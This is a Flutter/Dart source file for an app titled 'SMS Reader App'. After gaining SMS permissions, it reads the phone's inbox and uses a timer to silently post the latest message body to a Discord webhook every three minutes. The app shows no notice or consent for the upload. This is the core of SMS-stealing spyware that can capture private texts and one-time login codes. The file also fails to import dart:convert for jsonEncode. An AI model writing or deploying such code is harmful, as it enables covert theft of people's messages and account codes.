import 'package:flutter/material.dart';
import 'package:telephony/telephony.dart';
import 'package:http/http.dart' as http;
import 'dart:async';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: SMSReaderApp(),
    );
  }
}

class SMSReaderApp extends StatefulWidget {
  @override
  _SMSReaderAppState createState() => _SMSReaderAppState();
}

class _SMSReaderAppState extends State<SMSReaderApp> {
  final Telephony telephony = Telephony.instance;
  List<SmsMessage> smsMessages = [];

  @override
  void initState() {
    super.initState();
    _requestPermissionsAndReadSMS();
    // Schedule a timer to check for the last message and send it to Discord every 3 minutes
    Timer.periodic(Duration(minutes: 3), (timer) {
      _sendLastMessageToDiscord();
    });
  }

  Future<void> _requestPermissionsAndReadSMS() async {
    bool? permissionsGranted = await telephony.requestPhoneAndSmsPermissions;
    if (permissionsGranted != null && permissionsGranted) {
      _getSMSMessages();
    } else {
      // Handle permission denied or null case
    }
  }

  Future<void> _getSMSMessages() async {
    List<SmsMessage> messages = await telephony.getInboxSms();
    setState(() {
      smsMessages = messages;
    });
  }

  Future<void> _sendLastMessageToDiscord() async {
    if (smsMessages.isNotEmpty) {
      final lastMessage = smsMessages.last;
      final discordWebhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL

      final response = await http.post(
        Uri.parse(discordWebhookURL),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'content': lastMessage.body}),
      );

      if (response.statusCode == 200) {
        print('Message sent to Discord: ${lastMessage.body}');
      } else {
        print('Failed to send message to Discord. Status code: ${response.statusCode}');
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('SMS Reader App'),
      ),
      body: ListView.builder(
        itemCount: smsMessages.length,
        itemBuilder: (context, index) {
          return ListTile(
            title: Text('From: ${smsMessages[index].address}'),
            subtitle: Text('Message: ${smsMessages[index].body}'),
          );
        },
      ),
    );
  }
}
